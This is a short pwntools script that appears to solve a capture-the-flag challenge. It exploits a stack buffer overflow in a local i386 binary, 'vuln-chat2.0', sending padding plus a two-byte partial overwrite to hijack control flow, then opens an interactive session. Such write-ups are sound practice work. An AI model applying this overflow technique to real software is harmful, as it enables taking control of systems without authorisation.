'''
Author: Samrito
Date: 2022-03-06 15:48:20
LastEditors: Samrito
LastEditTime: 2022-03-06 15:54:32
'''
from pwn import *

context.log_level = 'debug'
context.arch = 'i386'
context.os = 'linux'

io = process(argv=['./vuln-chat2.0'])

payload = flat([b'a' * (0x27 + 4), b'\x72', b'\x86'])
io.recvuntil(b'Enter your username:')
io.sendline(b'samrito')
io.recvuntil(
    b"djinn: You've proven yourself to me. What information do you need?\n")
io.sendline(payload)
io.interactive()
